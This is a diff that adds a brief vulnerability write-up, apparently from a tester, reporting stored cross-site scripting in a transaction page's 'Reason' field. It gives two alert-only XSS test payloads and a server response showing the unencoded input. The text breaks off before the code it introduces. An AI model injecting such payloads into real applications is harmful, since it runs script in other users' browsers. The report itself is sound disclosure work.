@@ -1,0 +1,52 @@
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                     STORED XSS IN TRANSACTION PAGE
+
+                                gabriel
+                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1. tests at creation form
+
+
+On the transactions page there is a functionality to create another
+transactions, where one of the fields is injectable to html/js code.
+
+It is possible to inject an XSS payload within the “REason” field of the
+“Receiver” field. THis will be stored in the database, and executed in
+the next page refresh.
+
+
+1 tests at creation form
+════════════════════════
+
+  First classical JS payload ->
+  ┌────
+  │ <script>alert("hello")</script>
+  └────
+
+
+  Second JS payload ->
+  ┌────
+  │ <img src=x onerror="alert(document.domain)/">
+  └────
+
+  *response ->*
+  ┌────
+  │ "id":49,
+  │ "senderId":"biel@mail.com",
+  │ "receiverId":"<b>hi</b>","dateTime":"11/11/2025",
+  │ "reason":"<script>alert(\"helloowlrd\")</script>",
+  │ "amount":1,
+  │ "reference":"1",
+  └────
+
+  It is possible to see that there is a improper user input encode
+
+
+  Any user at applition can send malicious JS payloads to each other…
+
+  The `DataTable' library the responsible for carrying out this process,
+  and this is the code ->
